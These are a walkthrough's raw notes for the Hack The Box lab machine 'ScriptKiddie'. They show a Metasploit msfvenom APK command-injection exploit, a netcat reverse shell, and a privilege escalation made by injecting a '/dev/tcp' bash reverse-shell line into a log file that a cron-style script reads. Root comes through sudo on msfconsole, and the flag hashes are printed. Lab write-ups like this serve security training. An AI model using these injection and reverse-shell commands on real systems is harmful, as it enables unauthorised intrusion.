msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  5555             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Automatic

We'll also set the RHOSTS and RPORT = 5000

msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[+] kiddie.apk stored at /home/kali/.msf4/local/kiddie.apk

start a netcat listener

--------------------------------

On the website:

GOTO payload,

OS: Android
lhost: tun0
template: kiddie.apk

then generate

â”Œâ”€â”€(rootðŸ’€kali)-[/media/â€¦/HTB/Boxes/Active Boxes/ScriptKiddie]
â””â”€# nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.16.193] from (UNKNOWN) [10.10.10.226] 55400

ls
__pycache__
app.py
static
templates
whoami
kid

cd /home
ls
kid
pwn
cd kid
ls
html
logs
snap
user.txt
cat user.txt
ebcd104d70f36074dd1cdb84608117d4

cd pwn
ls
recon
scanlosers.sh <-- we might be able to run bash -i on this

let's get an interactive shell first:
 python3 -c â€œimport pty;pty.spawn(â€˜/bin/bashâ€™)

python3 -c "import pty;pty.spawn('/bin/bash')"
kid@scriptkiddie:~/html$ 

-------------------  --------  -----

Privesc:

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.193/1234 0>&1' #" >> hackers

kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi

The hackers file is in /home/kid/logs/hackers

Original Shell:

kid@scriptkiddie:/home/pwn$ cd /home/kid/logs
cd /home/kid/logs
kid@scriptkiddie:~/logs$ ls
ls
hackers
kid@scriptkiddie:~/logs$ echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.193/1234 0>&1' #" >> hackers
<i >& /dev/tcp/10.10.16.193/1234 0>&1' #" >> hackers
kid@scriptkiddie:~/logs$ 

Attack Shell:

â”Œâ”€â”€(rootðŸ’€kali)-[/media/â€¦/HTB/Boxes/Active Boxes/ScriptKiddie]
â””â”€# nc -lvvp 1234                                                                        1 â¨¯
listening on [any] 1234 ...
10.10.10.226: inverse host lookup failed: Unknown host
connect to [10.10.16.193] from (UNKNOWN) [10.10.10.226] 57886
bash: cannot set terminal process group (875): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ 

pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole

run metasploit as root then get the flag :)

msf6 > whoami
stty: 'standard input': Inappropriate ioctl for device
[*] exec: whoami

root

[*] exec: cat root.txt

ade2a3cca133a8f4afda222d735bbc32






